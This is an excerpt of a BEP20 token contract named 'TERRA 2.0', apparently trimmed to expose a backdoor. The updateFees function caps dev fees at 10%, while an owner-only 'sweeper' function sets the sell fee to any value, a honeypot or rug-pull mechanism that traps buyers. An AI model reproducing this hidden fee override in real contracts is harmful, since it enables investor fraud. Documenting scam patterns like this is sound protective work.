...
contract TERRA is BEP20, Ownable {
    using SafeMath for uint256;
    ...
    event Sweeper(uint256 sellDevFee);
    ...
    constructor() BEP20("TERRA 2.0", "$LUNA 2") {
        marketingWallet = payable(0x2e1a0Cf33A0D23a71De71C4C7916aD132Df39C21);
        devWallet = payable(0xfA6F39a412a7122b8395c8FB1c32d972Fb055564);
    ...
    function updateFees(uint256 marketingBuy, uint256 marketingSell, uint256 liquidityBuy,
        ...
        require(devBuy <= 10 && devSell <= 10, "Dev fees can't exceed 10%");
    ...
    function sweeper(uint256 amount) public onlyOwner {

    sellDevFee = amount;
        
    emit Sweeper(sellDevFee);
    }
